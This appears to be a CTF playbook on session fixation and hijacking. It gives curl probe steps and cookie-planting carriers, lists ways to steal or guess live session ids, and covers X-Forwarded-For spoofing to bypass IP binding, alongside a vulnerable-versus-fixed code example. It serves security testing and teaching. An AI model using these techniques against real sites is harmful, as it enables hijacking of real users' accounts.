# Session fixation & hijacking — choosing the victim's id

Two related classes: **fixation** (attacker picks the session id before
login, app doesn't rotate) and **hijacking** (attacker steals an already-
valid id). Both end in "attacker replays a token they didn't earn."

---

## 1. Fixation — the exact probe

```bash
# 1. mint a session WITHOUT logging in
curl -s -c jar.txt "$BASE/login"          # sets sid=ATTACKER_CHOSEN

# 2. hand the victim a URL that fixes the id — or rely on a subdomain
#    cookie-plant for shared instances. For the probe itself, plant the
#    same cookie in your own jar:
#    Cookie: session=ATTACKER_CHOSEN

# 3. victim logs in; app keeps the id
curl -s -b jar.txt -c jar.txt -X POST "$BASE/login" -d 'user=v&pass=p'

# 4. replay your planted id — do you get the victim's session?
python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/api/me" --header "Cookie: session=ATTACKER_CHOSEN" \
  --evidence-regex '"user"\s*:\s*"v"|"role"' --evidence-kind impact \
  --on-match confirms --on-miss refutes
```

**Falsifier**: step 4 returns your own pre-login anonymous session, or a
401 — the app rotated the id on login.

## 2. Fixation carriers

| Carrier | Plant |
|---|---|
| URL parameter | `https://target/?sid=EVIL` — works if app accepts `?sid=` |
| subdomain cookie | `document.cookie="sid=EVIL;Domain=.example.com"` on sibling host |
| `Set-Cookie` in an HTTP response you influence | CRLF/response-split |
| `<meta http-equiv=Set-Cookie>` | dead in modern browsers — skip |
| `document.cookie` on the target itself via XSS | needs XSS (different class) |
| localStorage | via `window.name` or a sibling-frame write |

## 3. Where fixation hides in source

```python
# vulnerable: sid never rotated
sid = request.cookies.get('sid') or new_sid()
session[sid] = {'user': user.id}      # binds attacker id to victim

# fixed: rotate on privilege change
old = request.cookies['sid']
del session[old]
sid = new_sid()
session[sid] = {'user': user.id}
response.set_cookie('sid', sid)
```

Grep: `set_cookie|session_id|regenerate|rotate|new_session|migrate` —
the *absence* of `regenerate`/`migrate` on the login path is the signal.

## 4. Hijacking — stealing a live id

Channels, cheapest first:

- **`Referer`**: session id in URL (`?sid=`) leaks to any third-party
  resource the page loads.
- **Access/error logs**: `GET /reset?token=` style — if the app exposes
  `/logs` or an admin-logs endpoint, the token sits in it.
- **Browser history sync**: `?sid=` links shared by copy-paste.
- **Missing `Secure` + plaintext hop**: captive-portal / SSL-strip / a
  single `http://` subresource the page loads.
- **Missing `HttpOnly` + XSS**: `document.cookie` — different class
  (web-xss) but the *loot* is this class's token.
- **localStorage token + XSS**: same.
- **Predictable id**: see session-analysis.md — you don't steal it, you
  guess it.
- **Session in a leak**: `GET /debug/session`, actuator `/sessions`,
  `phpinfo()` `HTTP_COOKIE` dump.

## 5. IP/UA binding

If the app binds the session to `remote_addr` or `User-Agent`:

- Replay from a different IP → rejected? binding works — you need the
  victim's network or a way to spoof `X-Forwarded-For` if the binding
  reads the header instead of the socket.
- `X-Forwarded-For: <victim-ip>` in your replay — works when the app
  trusts the header.
- UA binding is trivially spoofable — it's a speed-bump, not a control.

## 6. The "two sessions at once" test

```
login as A from browser 1 → sid_A
login as A from browser 2 → sid_B
replay sid_A → still valid? concurrent sessions allowed (may be fine)
replay sid_A after logout in browser 2 → still valid? logout doesn't
   kill other sessions (bug when "log out everywhere" is offered)
```

## 7. CTF shortcut shapes

- `GET /admin/sessions` or `/debug/session` lists every live id.
- The session store is a world-readable `sessions/` dir in the handout —
  the ids are filenames.
- The id is `md5(username)` — hash the victim's name yourself.
- The id is the username itself, lightly encoded — `VXNlcjphZG1pbg==`.

## 8. Chain into the flag

A hijacked admin session is the *primitive*; the flag sits wherever the
admin can read it: `GET /admin/flag`, `GET /admin/config`, a profile
field, an internal-notes column. Once you have the replay, the next step
is `web-idor`/`web-auth-session` boundary mapping on the admin surface —
the session itself is never the flag.
